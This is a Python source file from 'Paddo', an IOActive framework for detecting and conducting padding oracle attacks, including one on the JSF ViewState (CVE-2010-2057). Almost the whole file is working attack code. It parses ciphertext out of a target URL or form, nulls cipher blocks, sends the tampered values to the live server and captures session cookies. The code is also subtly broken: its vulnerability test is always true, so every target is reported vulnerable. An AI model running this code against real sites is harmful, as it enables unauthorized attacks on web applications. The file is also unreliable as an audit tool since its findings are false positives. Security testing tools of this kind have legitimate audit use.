#
#   Paddo 
#
#   Created: 01/27/2011
#
#   Purpose: framework for auditing and conducting padding oracle attacks
#
#   Copyright (c) 2012 by Lucas Apa, IOActive, Inc.
#
#   This program is free software; you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation; either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program; if not, write to the Free Software
#   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
# 

import re
import urllib2, urllib, cookielib
import base64, binascii
import encoding

class Audit():
    '''
    Detects if a Padding Oracle attack is feasible
    @author: Lucas Apa ( lucasapa.sec@gmail.com )
    '''

    def __init__(self, target):
        self._target = target
        self._parameters = {}
        


    def detect_block_size(self, cipher, encode = 1):
        '''
        Detects block size
        
        @param cipher: Ciphertext
        @return: Block size
        '''
        cipher_size = ""
        
        if cipher:
            cipher_size = len(urllib.unquote(cipher))
        else:
            cipher_size = -1
        
        #TODO: Enhance the block size detection
        if not cipher_size%8:
            size = 8
        else:
            size = 16
            
               
        print "[+] Blocksize Detected: %s bytes" % size
        
        return size 
        
        
    
    def detect_encoding(self):
        '''
        Detects cipher encoding
        
        @return: 0 - base64, 1 - ASCII, 2 - HEXASCII,
        '''
        if "/" in self._cipher or "+" in self._cipher or "%" in self._cipher or len(base64.b64decode(self._cipher)) % 8 == 0:
            print "[+] Encoding Detected: base64"
            return encoding.BASE64
        
        elif re.match('[G-Zg-z]', self._cipher):
            print "[+] Encoding Detected: ASCII"
            return encoding.ASCII
            
        elif re.match('[A-Fa-f0-9]', self._cipher):
            print "[+] Encoding Detected: HEXASCII"
            return encoding.HEXASCII
            
        else:
            return -1
    
    

           
    
    def parse_param(self, param):
        '''
        Parse the ciphertext from the given param
        
        @param param: HTTP parameter
        @return: Ciphertext
        '''
        ciphertxt = re.search('(?<='+param+'=)(.*)&?', self._target)
        
        if ciphertxt:
            ciphertxt = ciphertxt.group(0)
            self._target = self._target.replace(ciphertxt, "[CIPHERTXT]")
            return ciphertxt
        else:
            return ""
        
    def audit_param(self, param):
        print "[+] Target: " + self._target
        print "[+] Detecting a Padding Oracle in parameter: " + param
        self._cipher = self.parse_param(param)
        self._encoding = self.detect_encoding()

        decoded_cipher = base64.b64decode(urllib.unquote(self._cipher))

        self._block_size = self.detect_block_size(self._cipher, encode=self._encoding)
        blocks = []
        tmpblocks = [x for x in re.split('(\w{'+str(self._block_size*2)+'})', decoded_cipher.encode("hex")) if x]

        for block in tmpblocks:
            blocks.append([x.decode("hex") for x in re.split('(\w{2})', block) if x])
        
        #We send our first block nulled payload
        print "[!] Sending our first block nulled payload"

        tweek_blocks = blocks

        for byte in xrange(self._block_size):
            tweek_blocks[0][byte] = "\x00"
        
        tmp_cipher = ""  
        for x in tweek_blocks:
            tmp_cipher += "".join(x) 

       
        #We send our first block nulled payload
        if self._encoding == encoding.BASE64:
            self._target = self._target.replace("[CIPHERTXT]",base64.b64encode(tmp_cipher))
            res = urllib2.urlopen(self._target).read()
            self._target = self._target.replace(base64.b64encode(tmp_cipher), "[CIPHERTXT]")


        else:
            self._target = self._target.replace("[CIPHERTXT]",tmp_cipher)
            res = urllib2.urlopen(self._target).read()
            self._target = self._target.replace(tmp_cipher, "[CIPHERTXT]")
        
        if "BadPaddingException" or "error" in res:
            
            print "[!] JSF vulnerable to a Padding Oracle attack"
            #We start trapping cookies
            cookie_j = cookielib.CookieJar()
            self._cookie_handler = urllib2.HTTPCookieProcessor(cookie_j)
            cookie_opener = urllib2.build_opener(self._cookie_handler)
            urllib2.install_opener(cookie_opener) 
                
            #We ask for a new clean Cookie
            data = urllib.urlencode(self._parameters)
            req = urllib2.Request(self._target, data)
            res = urllib2.urlopen(req)
            
            return True
        return False

        
    def jsf_viewstate(self):
        '''
        Audits for Java Server Faces padding oracle attacks
        
        CVE-2010-2057
        https://issues.apache.org/jira/browse/MYFACES-2749
        
        '''
        print "[+] Target: " + self._target
        
        #We grep the forms to make an HTTP Request

        res = urllib2.urlopen(self._target)

        res_content = res.read()
        
        form_list = re.findall('<form (.*)</form>', repr(res_content), re.MULTILINE)
        if form_list:
            for form in form_list:
                params = re.findall('<input (.*?) \/>', form, re.MULTILINE)
                for param in params:
                    key = re.search('(?<=name\=\")(.*?)\"', param)
                    value = re.search('(?<=value\=\")(.*?)\"', param)
                    if key:
                        key = key.group(1)
                        if value:
                            value = value.group(1)
                        else:
                            value = ""
                        self._parameters[key] = value
        else:
            "[!] No forms found. Can't manipulate ViewState"
            
        if "javax.faces.ViewState" in self._parameters.keys():
            self._cipher = base64.b64decode(urllib.unquote(self._parameters["javax.faces.ViewState"]))
            self._encoding = encoding.BASE64
            
            #We prepare our blocks
            
            self._block_size = self.detect_block_size(self._cipher, encode=self._encoding)
            blocks = []
            tmpblocks = [x for x in re.split('(\w{'+str(self._block_size*2)+'})', self._cipher.encode("hex")) if x]
            for block in tmpblocks:
                blocks.append([x.decode("hex") for x in re.split('(\w{2})', block) if x])
           

            #We send our last block nulled payload
            print "[!] Sending our last block nulled payload"
            tweek_blocks = blocks[:]
            for byte in xrange(self._block_size):
                tweek_blocks[len(blocks)-1][byte] = "\x00"
                
            tmp_cipher = ""  
            for x in tweek_blocks:
                tmp_cipher += "".join(x) 
            
            

            self._parameters["javax.faces.ViewState"] = urllib.unquote(base64.b64encode(tmp_cipher))
            self._cipher = urllib.unquote(base64.b64encode(self._cipher))
            try: 
                data = urllib.urlencode(self._parameters)
                
                req = urllib2.Request(self._target, data)
                res = urllib2.urlopen(req).read()
            except urllib2.HTTPError, e:
                if e.code == 500:
                    res = "error"               
            
            if "BadPaddingException" or "error" in res:
                    
                print "[!] JSF vulnerable to a Padding Oracle attack"
                #We start trapping cookies
                cookie_j = cookielib.CookieJar()
                self._cookie_handler = urllib2.HTTPCookieProcessor(cookie_j)
                cookie_opener = urllib2.build_opener(self._cookie_handler)
                urllib2.install_opener(cookie_opener) 
                    
    
                #We ask for a new clean Cookie
                self._parameters["javax.faces.ViewState"] = self._cipher
                data = urllib.urlencode(self._parameters)
                req = urllib2.Request(self._target, data)
                res = urllib2.urlopen(req)
            
                return True
            return False
